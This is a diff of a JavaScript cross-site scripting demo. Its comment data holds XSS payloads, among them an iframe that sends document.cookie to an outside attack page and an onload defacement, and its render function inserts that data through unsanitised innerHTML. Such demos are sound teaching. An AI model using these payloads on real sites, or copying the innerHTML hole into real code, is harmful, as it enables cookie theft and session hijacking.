@@ -13,74 +13,62 @@ var users = {
   }
 }
 var posts = {
-        7891451: {
-                author: 14587,
-                text: `Imagine we can encapsulate these secondary responsibilities in functions /  
-                        The static String.fromCharCode() method returns a string created 
-                        from the specified sequence of UTF-16 code units`
-        },
-        7891452: {
-                author: 28419,
-                text: `В конструкторе ключевое слово super используется как функция, вызывающая родительский конструктор. 
-                        Её необходимо вызвать до первого обращения к ключевому слову this в теле конструктора. 
-                        Ключевое слово super также может быть использовано для вызова функций родительского объекта`
-        },
-        7891453: {
-                author: 28419,
-                text: `DOM не обрабатывает или не вынуждает проверять пространство имен как таковое. 
-                        Префикс пространства имен, когда он связан с конкретным узлом, не может быть изменен`
-        },
-        7891454: {
-                author: 14587,
-                text: `Ключевое слово super используется для вызова функций, принадлежащих родителю объекта. 
-                        Глобальный объект String является конструктором строк, или, последовательностей символов.
-                        HTML элемент <template> — это механизм для отложенного рендера клиентского контента, 
-                        который не отображается во время загрузки, но может быть инициализирован при помощи JavaScript`
-        }
+  7891451: {
+    author: 14587,
+    text: `Imagine we can encapsulate these secondary responsibilities in functions /  
+           The static String.fromCharCode() method returns a string created 
+           from the specified sequence of UTF-16 code units`
+  },
+  7891452: {
+    author: 28419,
+    text: `There is no JavaScript property or object named TypedArray, but properties and methods can be used with typed array objects.`
+  },
+  7891453: {
+    author: 28419,
+    text: `Typed arrays are not arrays.
+           isArray() on a typed array returns false.
+           Many array methods (like push and pop) are not supported by typed arrays.
+           Typed arrays are array-like objects for storing binary data in memory.`
+  },
+  7891454: {
+    author: 14587,
+    text: `The difference between an Uint8Array and an Uint8ClampedArray is how values are added.
+           If you set one element in an Uint8ClampedArray to a value outside the 0-255 range, it will default to 0 or 255.
+           A typed array will just take the first 8 bits of the value.`
+  }
 }
+
 var comments = {
-        91078454: {
-                postId: 7891451,
-                author: 28419,
-                text: `<IMG SRC=/ onerror="document.write(String.fromCharCode(88,83,83))"></img>`
-        },
-        91078455: {
-                postId: 7891452,
-                author: 41457,
-                text: `<IFRAME SRC=js/attack.html 
-                          onmouseover="window.open('https://garevna.github.io/js-samples/js/attack.html#' + 
-                            document.cookie, '_self')">
-                      </IFRAME>
-`
-        },
-        91078457: {
-                postId: 7891453,
-                author: 41457,
-                text: `<svg/onload='document.write("Looser");
-                  document.body.style.backgroundColor="black";
-                  document.body.style.color="red";
-                  document.body.style.fontSize="50px";
-                  document.body.style.fontWeight="bold";
-                  document.body.style.textAlign="center";
-                  document.body.style.paddingTop="45%";'>`
-        },
-        91078458: {
-                postId: 7891454,
-                author: 14587,
-                text: `The Element.namespaceURI read-only property returns the namespace URI of the element, 
-                        or null if the element is not in a namespace`
+  91078454: {
+    postId: 7891451,
+    author: 28419,
+    text: `<IMG SRC=/ onerror="document.write(String.fromCharCode(88,83,83))"></img>`
+  },
+  91078455: {
+    postId: 7891452,
+    author: 41457,
+    text: `<IFRAME SRC=js/attack.html onmouseover="window.open('https://garevna.github.io/js-samples/js/attack.html#' +  document.cookie, '_self')"></IFRAME>`
+  },
+  91078457: {
+    postId: 7891453,
+    author: 41457,
+    text: `<img src="https://402.ecma-international.org/10.0/img/ecma-logo.svg" onload="document.write('Looser');document.body.style='background:black;color:red;font-size:50px;font-weight:bold;text-align:center;padding-top:45%;'"/>`
+  },
+  91078458: {
+    postId: 7891454,
+    author: 14587,
+    text: `The Element.namespaceURI read-only property returns the namespace URI of the element, or null if the element is not in a namespace`
         }
 }
 
-function getCurrentPostComments ( postId ) {
-        for ( var x in comments ) {
-                if ( comments [ x ].postId === postId ) {
-                        var comment = document.createElement ( 'p' )
-                        comment.innerHTML = '<b>' + 
-                                users [ comments [ x ].author ].name + 
-                                '</b></br>' + comments [ x ].text
-                        document.body.appendChild ( comment )
-                }
-        }
+function getCurrentPostComments (postId) {
+  for (var id in comments) {
+    if (comments[id].postId === postId) {
+      var comment = document.createElement ('p')
+      comment.innerHTML = '<b>' + users[comments[id].author].name + '</b></br>' + comments[id].text
+      document.body.appendChild(comment)
+    }
+  }
 }
-getCurrentPostComments ( 7891453 )
+
+getCurrentPostComments(7891453)
